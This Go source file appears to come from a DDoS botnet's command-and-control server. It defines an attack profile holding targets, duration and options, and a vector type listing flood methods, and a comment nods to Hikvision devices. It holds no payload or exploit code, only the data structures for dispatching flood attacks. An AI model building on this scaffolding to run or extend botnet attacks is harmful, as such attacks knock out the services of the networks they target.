package floods

import "cnc/internal/master/floods/flags"

type AttackProfile struct {
	ID    uint8
	AtkId uint16
	// for hikvision, my love <3
	Duration uint32

	// IPV4 targets
	Targets map[uint32]uint8

	// Options
	Options map[*flags.Flag]string

	L7Target string
}

type Vector struct {
	// ID is the id of the vector
	ID uint8
	// Type is the type of the vector
	Type int
	// Description is a simple description for the current vector.
	Description string
	// Flags are the flags the method has
	Flags []uint8
	// Roles are the roles of the method
	Roles []string

	API  bool
	IsL7 bool
}

func Init() {
	initFlags()
	initVectors()
}
